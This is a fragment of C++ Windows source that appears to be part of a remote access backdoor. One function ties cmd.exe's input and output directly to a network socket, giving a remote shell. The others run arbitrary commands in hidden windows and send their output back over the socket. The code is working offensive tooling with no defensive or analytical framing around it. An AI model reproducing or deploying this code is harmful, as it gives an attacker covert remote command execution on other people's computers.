int startCMD(SOCKET* mainCallback) {
	
	SOCKET clientSocket = CreateChildSocket(*mainCallback, PORT_SHELL, 0);
	if (clientSocket == INVALID_SOCKET) { return 1; }
	
	// start cmd.exe and redirect std IOE
	char Process[] = "cmd.exe";
	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)clientSocket;
	PROCESS_INFORMATION pinfo;
	int ret = CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);
	CloseHandle(pinfo.hProcess);
	CloseHandle(pinfo.hThread);
	
	CloseChildSocket(*mainCallback, PORT_SHELL, clientSocket);
	
	return ret;
}

DWORD runCmd(SOCKET& socket, std::string cmd) {
	
	// setup handles
	HANDLE g_hChildStd_Rd = NULL;
	HANDLE g_hChildStd_Wr = NULL;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	if (!CreatePipe          (&g_hChildStd_Rd, &g_hChildStd_Wr, &sa, 0)) { return 1; }
	if (!SetHandleInformation( g_hChildStd_Rd, HANDLE_FLAG_INHERIT,  0)) { return 1; }
	
	// create process
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdOutput = g_hChildStd_Wr;
	siStartInfo.hStdError  = g_hChildStd_Wr;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	
	CreateProcess(NULL, (char*)("cmd.exe /c " + cmd).c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);
	CloseHandle(g_hChildStd_Wr);
	
	while (true) {
		DWORD STDOUT_read;
		CHAR  STDOUT_buf[BIGSIZ];
		bool  STDOUT_success = FALSE;
		STDOUT_success = ReadFile(g_hChildStd_Rd, STDOUT_buf, BIGSIZ, &STDOUT_read, NULL);
		if(!STDOUT_success || STDOUT_read == 0) { break; }
		std::string s(STDOUT_buf, STDOUT_read);
		echoNsend(socket, s, false, false);
	}
	
	DWORD exit_code;
	GetExitCodeProcess(piProcInfo.hProcess, &exit_code);
	
	echoNsend(socket, "[*] (" + cmd + ") returned " + std::to_string(exit_code));
	
	return exit_code;
}

BOOL runCmdBg(std::string cmd) {
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	
	int ret = CreateProcess(NULL, (char*)("cmd.exe /c " + cmd).c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	
	CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
	
	return ret;
}